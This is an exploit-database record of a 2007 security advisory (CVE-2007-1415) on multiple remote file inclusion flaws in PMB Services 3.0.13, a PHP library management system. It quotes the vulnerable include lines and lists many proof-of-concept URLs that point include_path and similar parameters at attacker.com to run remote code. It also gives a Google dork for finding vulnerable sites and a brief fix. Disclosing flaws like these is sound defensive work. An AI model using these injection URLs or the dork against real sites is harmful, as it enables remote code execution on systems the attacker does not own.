{
  "id": "3443",
  "title": "PMB Services 3.0.13 - Multiple Remote File Inclusions",
  "cve": "CVE-2007-1415",
  "vuln_type": "unknown",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_68$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_68$2007] PMB Services <= 3.0.13 Multiple Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : March, 9th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv68-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : PMB Services \r\nversion       : <= 3.0.13\r\nVendor        : http://www.sigb.net/\r\nDescription :\r\n\r\nPMB is a completely free ILS (Integrated Library management System). The domain of software for libraries is almost exclusively occupied by proprietary products.\r\nWe are some librarians, users and developers deploring this state of affairs.\r\n\r\nPMB is based on web technology. This is what we sometimes call a 'web-app'.\r\nPMB requires an HTTP server (such as Apache, but this is not an obligation), the MySQL database and the PHP language.\r\n\r\nThe main functions of PMB are :\r\n\r\n    * Supporting the UNIMARC format\r\n    * Authorities management (authors, publishers, series, subjects...)\r\n    * Management of loans, holds, borrowers...\r\n    * A user-friendly configuration\r\n    * The ability to import full bibliographic records\r\n    * A user-friendly OPAC integrating a browser\r\n    * Loans management with a module designed to serve even the very small establishments\r\n    * Serials management\r\n    * Simple administration procedures that can be handled easily even by the library staff...\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n- Invalid include function at includes/resa_func.inc.php :\r\n\r\n---------------includes/resa_func.inc.php--------------------------------------\r\n<?php\r\n// +-------------------------------------------------+\r\n// \u00a9 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)\r\n// +-------------------------------------------------+\r\n// $Id: resa_func.inc.php,v 1.49 2006/10/31 07:59:35 touraine37 Exp $\r\n\r\nrequire_once(\"$class_path/quotas.class.php\");\r\n...\r\n------------------------------------------------------------------\r\n\r\n- Invalid include function at includes/bull_info.inc.php :\r\n\r\n--------------includes/bull_info.inc.php--------------------------------------\r\n<?php\r\n// +-------------------------------------------------+\r\n// \u00a9 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)\r\n// +-------------------------------------------------+\r\n// $Id: bull_info.inc.php,v 1.23 2006/08/29 20:33:32 touraine37 Exp $\r\n\r\n// affichage des infos bulletin\r\n\r\nrequire_once($include_path.\"/resa_func.inc.php\");\r\n...\r\n--------------------------------------------------------------------\r\n\r\n- Invalid include function at includes/misc.inc.php :\r\n\r\n---------------includes/misc.inc.php-------------------------------------\r\n<?php\r\n// +-------------------------------------------------+\r\n// \u00a9 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)\r\n// +-------------------------------------------------+\r\n// $Id: misc.inc.php,v 1.46 2006/10/18 17:06:28 dbellamy Exp $\r\n\r\n// ----------------------------------------------------------------------------\r\n//\tfonctions de formatage de cha.ne\r\n// ----------------------------------------------------------------------------\r\n// reg_diacrit : fonction pour traiter les caract\u008fres accentu.s en recherche avec regex\r\n\r\n// choix de la classe ? utiliser pour envoi en pdf\r\nif (!$fpdf) {\r\n\tif ($charset != 'utf-8') $fpdf = 'FPDF'; else $fpdf = 'UFPDF';\r\n}\r\n\r\nrequire_once($include_path.\"/marc_tables/\".$lang.\"/empty_words\");\r\n\r\n...\r\n------------------------------------------------------------------\r\n\r\n- Invalid include function at opac_css/rec_panier.php:\r\n\r\n-------------opac_css/rec_panier.php------------------------------\r\n<?php\r\n// +-------------------------------------------------+\r\n// \u00a9 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)\r\n// +-------------------------------------------------+\r\n// $Id: rec_panier.php,v 1.5 2006/12/10 10:04:10 touraine37 Exp $\r\n\r\nrequire_once($base_path.'/includes/session.inc.php');\r\n\r\n?>\r\n-----------------------------------------------------------------\r\n\r\n- - Invalid include function at opac_css/includes/author_see.inc.php :\r\n\r\n--------------------opac_css/includes/author_see.inc.php------------------------\r\n<?php\r\n// +-------------------------------------------------+\r\n// \u00a9 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)\r\n// +-------------------------------------------------+\r\n// $Id: author_see.inc.php,v 1.32 2006/12/29 16:10:04 touraine37 Exp $\r\n\r\n// affichage du detail pour un auteur\r\n\r\nrequire_once($base_path.'/includes/templates/author.tpl.php');\r\n...\r\n----------------------------------------------------------------\r\n\r\n\r\nVariables $class_path $include_path and $base_path are not properly sanitized.\r\nWhen register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.\r\n\r\nalso affected files :\r\n\r\nincludes/options/options_date_box.php\r\nincludes/options/options_file_box.php\r\nincludes/options/options_list.php\r\nincludes/options/options_query_list.php\r\nincludes/options/options_text.php\r\nincludes/options_empr/options.php\r\nincludes/options_empr/options_comment.php\r\nincludes/options_empr/options_date_box.php\r\nincludes/options_empr/options_list.php\r\nincludes/options_empr/options_query_list.php\r\nincludes/options_empr/options_text.php\r\nadmin/import/iimport_expl.php\r\nadmin/netbase/clean.php\r\nadmin/notices/perso.inc.php\r\nadmin/quotas/main.inc.php\r\nadmin/param/param_func.inc.php\r\nadmin/sauvegarde/lieux.inc.php\r\nautorites.php\r\nacount.php\r\ncart.php\r\nedit.php\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/[PMB_path]/includes/resa_func.inc.php?class_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/bull_info.inc.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options/options_date_box.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options/options_file_box.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options/options_list.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options/options_query_list.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options/options_text.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options_empr/options.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options_empr/options_comment.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options_empr/options_date_box.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options_empr/options_list.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options_empr/options_query_list.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/includes/options_empr/options_text.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/admin/import/iimport_expl.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/admin/netbase/clean.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/admin/notices/perso.inc.php?class_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/admin/quotas/main.inc.php?class_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/admin/param/param_func.inc.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/admin/sauvegarde/lieux.inc.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/opac_css/rec_panier.php?base_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/opac_css/includes/author_see.inc.php?base_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/autorites.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/account.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/cart.php?include_path=http://attacker.com/evil?\r\nhttp://www.target.com/[PMB_path]/edit.php?include_path=http://attacker.com/evil?\r\n\r\nGoogle Dork :   \" allinurl:opac_css \" or \"allinurl:pmb/opac_css\" or \"PMB opac_css\"\r\n~~~~~~\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Sanitize variable $class_dir $include_path and $base_path on affected files.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-03-09]",
  "url": "https://www.exploit-db.com/exploits/3443"
}